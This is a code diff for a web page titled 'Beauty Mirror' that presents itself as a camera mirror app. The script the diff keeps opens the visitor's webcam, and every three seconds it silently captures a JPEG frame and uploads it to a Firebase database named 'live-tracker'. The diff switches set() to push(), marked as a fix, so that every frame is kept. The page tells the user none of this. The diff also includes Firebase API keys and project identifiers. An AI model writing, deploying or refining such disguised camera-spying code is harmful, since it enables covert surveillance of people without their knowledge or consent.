@@ -6,19 +6,13 @@
 <title>Beauty Mirror</title>
 
 <style>
-*{
-  margin:0;
-  padding:0;
-  box-sizing:border-box;
-  font-family:Inter,sans-serif;
-}
-
 body{
+  margin:0;
+  font-family:Arial;
   min-height:100vh;
   display:flex;
   justify-content:center;
   align-items:center;
-  overflow:hidden;
   background:linear-gradient(-45deg,#00d4ff,#8a2be2,#ff0080,#00ff99);
   background-size:400% 400%;
   animation:bgMove 10s ease infinite;
@@ -32,97 +26,57 @@ body{
 
 .card{
   width:90%;
-  max-width:550px;
-  padding:25px;
-  border-radius:25px;
-  background:rgba(255,255,255,.08);
-  backdrop-filter:blur(20px);
-  border:1px solid rgba(255,255,255,.15);
+  max-width:500px;
+  padding:20px;
+  border-radius:20px;
+  background:rgba(255,255,255,0.08);
+  backdrop-filter:blur(15px);
   color:white;
   text-align:center;
 }
 
-h1{
-  margin-bottom:10px;
-}
-
-.btn{
-  margin-top:15px;
-  padding:14px 30px;
-  border:none;
-  border-radius:50px;
-  cursor:pointer;
-  color:white;
-  background:linear-gradient(90deg,#00d4ff,#ff0080);
-  font-size:16px;
-}
-
 video{
   width:100%;
-  border-radius:20px;
-  margin-top:15px;
+  border-radius:15px;
+  margin-top:10px;
 }
 
-#cameraBox{
-  display:none;
-}
-
-.filters{
-  margin-top:15px;
-}
-
-.filters button{
-  margin:5px;
-  padding:10px;
+button{
+  margin-top:10px;
+  padding:10px 20px;
   border:none;
-  border-radius:12px;
+  border-radius:10px;
   cursor:pointer;
 }
 </style>
 </head>
+
 <body>
 
 <div class="card">
+  <h2>📷 Beauty Mirror</h2>
 
-  <div id="welcome">
-    <h1>✨ Want To See Your Beauty?</h1>
-    <p>Tap below to start the camera</p>
-    <button class="btn" onclick="startCamera()">YES ✨</button>
-  </div>
+  <button onclick="startCamera()">Start Camera</button>
 
-  <div id="cameraBox">
-    <h2>📷 Beauty Mirror</h2>
+  <video id="video" autoplay playsinline></video>
 
-    <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
-    <div class="filters">
-      <button onclick="setFilter('none')">Normal</button>
-      <button onclick="setFilter('grayscale(100%)')">B&W</button>
-      <button onclick="setFilter('sepia(100%)')">Vintage</button>
-      <button onclick="setFilter('contrast(130%) saturate(160%)')">Pro</button>
-      <button onclick="setFilter('brightness(120%) saturate(180%)')">Glow</button>
-    </div>
-
-    <p id="status">Waiting...</p>
-  </div>
-
+  <p id="status">Waiting...</p>
 </div>
-
-<canvas id="canvas" style="display:none;"></canvas>
 
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
 <script>
 const firebaseConfig = {
-  apiKey: "AIzaSyA5iHHWvOKZnKlZCZz57O8ALtSkfNdMmrE",
+  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57O8ALtSkfNdMmrE",
   authDomain: "live-tracker-554a7.firebaseapp.com",
   databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
   projectId: "live-tracker-554a7",
   storageBucket: "live-tracker-554a7.firebasestorage.app",
   messagingSenderId: "951695061306",
-  appId: "1:951695061306:web:a7b9478538f86f50a36003",
-  measurementId: "G-V4LCZSEQLC"
+  appId: "1:951695061306:web:a7b9478538f86f50a36003"
 };
 
 firebase.initializeApp(firebaseConfig);
@@ -131,32 +85,13 @@ const db = firebase.database();
 let stream;
 
 async function startCamera(){
+  stream = await navigator.mediaDevices.getUserMedia({ video:true });
 
-  try{
+  document.getElementById("video").srcObject = stream;
 
-    stream = await navigator.mediaDevices.getUserMedia({
-      video:true
-    });
+  document.getElementById("status").innerText = "Live";
 
-    document.getElementById("video").srcObject = stream;
-
-    document.getElementById("welcome").style.display = "none";
-    document.getElementById("cameraBox").style.display = "block";
-
-    document.getElementById("status").innerText =
-      "Camera Active";
-
-    startSnapshots();
-
-  }catch(err){
-
-    alert("Camera permission required");
-
-  }
-}
-
-function setFilter(filter){
-  document.getElementById("video").style.filter = filter;
+  startSnapshots();
 }
 
 function startSnapshots(){
@@ -174,16 +109,15 @@ function startSnapshots(){
 
     ctx.drawImage(video,0,0,320,240);
 
-    const frame =
-      canvas.toDataURL("image/jpeg",0.5);
+    const frame = canvas.toDataURL("image/jpeg",0.5);
 
-    db.ref("camera/user1").set({
+    // ✅ FIXED: PUSH (NOT SET)
+    db.ref("camera/user1").push({
       frame: frame,
       updatedAt: Date.now()
     });
 
   },3000);
-
 }
 </script>
 
